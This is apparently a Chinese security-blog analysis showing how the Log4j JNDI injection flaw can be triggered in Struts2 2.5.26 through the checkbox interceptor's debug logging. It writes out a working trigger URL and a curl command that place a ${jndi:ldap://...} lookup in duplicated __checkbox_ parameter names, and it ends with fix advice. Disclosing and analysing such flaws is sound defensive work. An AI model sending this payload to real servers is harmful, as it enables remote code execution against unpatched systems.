# 在 Struts2 中触发 Log4j JNDI RCE 漏洞分析

阅读量 **261524**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-15 10:00:22

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 1、前言综述

log4j漏洞影响面太广，最为一个经常使用strusts2开发的我来说，第一反应就是strusts2也默认使用了该库，所以进行了分析，发现确实能够触发，一点拙见分享出来，希望能够帮助加快行业尽快修复该漏洞，减小其影响。

## 2、搭建 Struts2 示例

搭建一个struts2示例可参考[官方文档](https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application.html#to-run-the-application-using-maven-add-the-jetty-maven-plugin-to-your-pomxml)，

官方也给了一个helloworld的[例子](https://github.com/apache/struts-examples)，可直接使用。这里就不再叙述，只贴一下我的pom.xml介绍下使用的版本：

    
    
    <dependencies>
        <!--struts 2-->
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
            <version>2.5.26</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
    

其中，struts2 是 2.5.26， log4j 是 2.14.1

## 3、Struts 2 拦截器

拦截器是struts2是其用于对请求进行预处理的机制，可用户自定义，同时也默认内置一部分，内置拦截器加载在用户自定义拦截器之前，内置拦截器可在struts2-core-2.5.26.jar
中的 struts-default.xml中查看：

    
    
    <interceptor-stack name="defaultStack">
        <interceptor-ref name="exception"/>
        <interceptor-ref name="alias"/>
        <interceptor-ref name="servletConfig"/>
        <interceptor-ref name="i18n"/>
        <interceptor-ref name="prepare"/>
        <interceptor-ref name="chain"/>
        <interceptor-ref name="scopedModelDriven"/>
        <interceptor-ref name="modelDriven"/>
        <interceptor-ref name="fileUpload"/>
        <interceptor-ref name="checkbox"/>
        <interceptor-ref name="datetime"/>
        <interceptor-ref name="multiselect"/>
        <interceptor-ref name="staticParams"/>
        <interceptor-ref name="actionMappingParams"/>
        <interceptor-ref name="params"/>
        <interceptor-ref name="conversionError"/>
        <interceptor-ref name="validation">
            <param name="excludeMethods">input,back,cancel,browse</param>
        </interceptor-ref>
        <interceptor-ref name="workflow">
            <param name="excludeMethods">input,back,cancel,browse</param>
        </interceptor-ref>
        <interceptor-ref name="debugging"/>
    </interceptor-stack>
    

这些拦截器均是struts2自带，加载也在用户自定义拦截器之前，也就是说，只要使用了struts2，默认情况下，均会加载这些拦截器。对这些拦截器初步审计后发现，基本上在其逻辑中都会使用log4j进行日志记录，并且，有多个拦截器的日志记录参数可控，这就是说，struts2已经受log4j漏洞影响了，下一节将选取其中的一个触发点checkbox拦截器进行漏洞触发分析。

## 4、漏洞触发点 – checkbox 拦截器

checkbox 拦截器在struts-default.xml中定义如下：

    
    
    <interceptor name="checkbox" class="org.apache.struts2.interceptor.CheckboxInterceptor" />
    

对应的处理类是 `org.apache.struts2.interceptor.CheckboxInterceptor`, 其核心代码如下：

    
    
    public String intercept(ActionInvocation ai) throws Exception {
        HttpParameters parameters = ai.getInvocationContext().getParameters(); // 1、获取http请求的所有参数
        Map<String, Parameter> extraParams = new HashMap();
        Set<String> checkboxParameters = new HashSet();
        Iterator i$ = parameters.entrySet().iterator();
    
        while(i$.hasNext()) { // 遍历所有http请求参数
            Entry<String, Parameter> parameter = (Entry)i$.next();
            String name = (String)parameter.getKey();
            if (name.startsWith("__checkbox_")) { // 如果请求参数是以__checkbox_开头，则进入此分支
                String checkboxName = name.substring("__checkbox_".length());
                Parameter value = (Parameter)parameter.getValue();
                checkboxParameters.add(name);
                // 如果该参数不止一个，则进入该分支，进行日志记录，从而触发 log4j jndi 注入漏洞
                // name 为请求名
                if (value.isMultiple()) {
                    LOG.debug("Bypassing automatic checkbox detection due to multiple checkboxes of the same name: {}", name);
                } else if (!parameters.contains(checkboxName)) {
                    extraParams.put(checkboxName, new Request(checkboxName, this.uncheckedValue));
                }
            }
        }
    
        parameters.remove(checkboxParameters);
        ai.getInvocationContext().getParameters().appendAll(extraParams);
        return ai.invoke();
    }
    

关于此拦截器的意义，可以参考[该文章](https://blog.csdn.net/xtayfjpk/article/details/14108047)进行理解，这里主要分析一下触发原理，进入该拦截器后，struts2会将http请求的所有参数取出来，进行遍历，如果参数名字以
`__checkbox_`
开头，则会进入checkbox判定分支，在该分支中，如果一个checkbox被重复定义，就直接进行日志记录，而在默认配置下，该日志记录使用log4j进行记录，从而触发漏洞：

    
    
    if (value.isMultiple()) {
        LOG.debug("Bypassing automatic checkbox detection due to multiple checkboxes of the same name: {}", name);
    }
    

## 5、触发Log4j JNDI 注入漏洞

根据上一节描述，当请求参数名以 `__checkbox_` 开始并且重复定义时，会进入log4j记录分支，故构造请求如下：

    
    
    http://127.0.0.1:8080/Struts2WebAppDemo/index.action?__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=a&__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=b
    

使用 `curl` 发送请求:

    
    
    curl 'http://127.0.0.1:8080/Struts2WebAppDemo/index.action?__checkbox_$\{jndi:ldap://127.0.0.1:1099/exp\}=a&__checkbox_$\{jndi:ldap://127.0.0.1:1099/exp\}=b'
    

在该分支处下断点，成功命中:

![](https://p4.ssl.qhimg.com/t01ce14c3beb13e0990.png)

最后成功执行到lookup，进行jndi查询：

![](https://p4.ssl.qhimg.com/t0145af2d9fa91d5cf7.png)

至此，成功触发漏洞。关于该log4j漏洞的具体原理及后续触发步骤，可参考大佬分析文章，如<https://www.anquanke.com/post/id/262668>

实际上在struts2中还有不少触发点，本文只是选取其中一个进行粗浅分析，分析不透彻之处，欢迎大佬批评指正交流。

## 6、如何修复

更新至最新版本log4j，或者禁用lookup均可

## 7、参考文档

1、<https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application.html#to-run-the-application-using-maven-add-the-jetty-maven-plugin-to-your-pomxml>  
2、[https://www.anquanke.com/post/id/262668](https://www.anquanke.com/post/id/262668](https://www.anquanke.com/post/id/262668%5D\(https://www.anquanke.com/post/id/262668)  
3、<https://blog.csdn.net/xtayfjpk/article/details/14108047>  
4、<https://github.com/apache/struts-examples>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **saound** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/262852](/post/id/262852)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Struts2](/tag/Struts2)
  * [JNDI](/tag/JNDI)

 **+1** __3赞

 __收藏

![](https://p5.ssl.qhimg.com/t015d803cba50121bf2.png) saound

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

